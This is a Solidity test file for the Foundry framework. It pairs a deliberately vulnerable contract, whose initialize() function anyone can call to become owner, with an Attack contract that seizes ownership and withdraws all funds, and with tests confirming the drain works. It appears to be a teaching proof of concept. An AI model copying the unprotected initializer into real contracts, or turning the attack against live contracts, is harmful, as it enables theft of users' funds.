pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable Contract with Improper Initialization
contract VulnerableContract {
    // Vulnerability: owner is set via initialize without protection
    address public owner;

    // Anyone can call initialize, and it overwrites owner
    function initialize() public {
        owner = msg.sender;
    }

    // Function to deposit Ether into the contract
    function deposit() public payable {}

    // Only the owner can withdraw funds
    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    // Fallback receive function
    receive() external payable {}
}

// Attacker contract that exploits the vulnerability
contract Attack {
    VulnerableContract public vulnerable;
    
    // Passing the address of the VulnerableContract
    constructor(address payable _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Attack sequence: Acquire ownership and withdraw funds
    function attack() public {
        // Step 1: Call initialize() to become the owner
        vulnerable.initialize();
        
        // Step 2: Withdraw all Ether from the vulnerable contract
        vulnerable.withdraw();
    }

    // receive function to accept Ether transfer
    receive() external payable {}
}

// Forge Foundry test contract focusing on the vulnerability
contract ImproperInitializationTest is Test {
    VulnerableContract public vulnerable;
    Attack public attackerContract;
    
    // Use a designated attacker address
    address attacker = address(0x1337);
    
    // Amount of Ether to deposit into the VulnerableContract
    uint256 constant DEPOSIT_AMOUNT = 1 ether;

    // setUp deploys the vulnerable contract and funds it
    function setUp() public {
        // Deploy the vulnerable contract
        vulnerable = new VulnerableContract();
        
        // Fund the VulnerableContract with DEPOSIT_AMOUNT via deposit()
        vulnerable.deposit{value: DEPOSIT_AMOUNT}();
        
        // Deploy the attacker contract, passing the vulnerable contract's payable address
        // Note: The constructor parameters in Attack require a payable address
        attackerContract = new Attack(payable(address(vulnerable)));
    }
    
    // Test the vulnerability exploitation using the Attack contract
    function testAttackExploit() public {
        // Confirm that initially the owner is not set (i.e., it's zero address)
        assertEq(vulnerable.owner(), address(0));
        
        // Switch context so that operations in the attack() function are called from the attacker account
        // However, note that in the Attack contract, msg.sender will be the Attack contract itself when making calls.
        vm.prank(attacker);
        attackerContract.attack();

        // After the attack, the VulnerableContract's owner should be the Attack contract address because
        // in the attack() function, vulnerable.initialize() is invoked from the Attack contract context
        assertEq(vulnerable.owner(), address(attackerContract), "Owner should be the attacker contract");

        // The balance of the vulnerable contract should now be zero after withdrawal
        assertEq(address(vulnerable).balance, 0, "Vulnerable contract should have zero balance");
        
        // The Attack contract should have received the withdrawn funds
        assertEq(address(attackerContract).balance, DEPOSIT_AMOUNT, "Attack contract should receive the funds");
    }

    // Test that anyone can reinitialize the contract by calling initialize() directly
    function testMultipleInitialization() public {
        // First, some random user calls initialize() and becomes the owner
        address randomUser = address(0xBEEF);
        vm.prank(randomUser);
        vulnerable.initialize();
        assertEq(vulnerable.owner(), randomUser, "Owner should be randomUser after first initialization");
        
        // Now, the attacker calls initialize() again to override owner
        vm.prank(attacker);
        vulnerable.initialize();
        assertEq(vulnerable.owner(), attacker, "Owner should be attacker after reinitialization");
    }

    // Allow the test contract to receive Ether
    receive() external payable {}
}
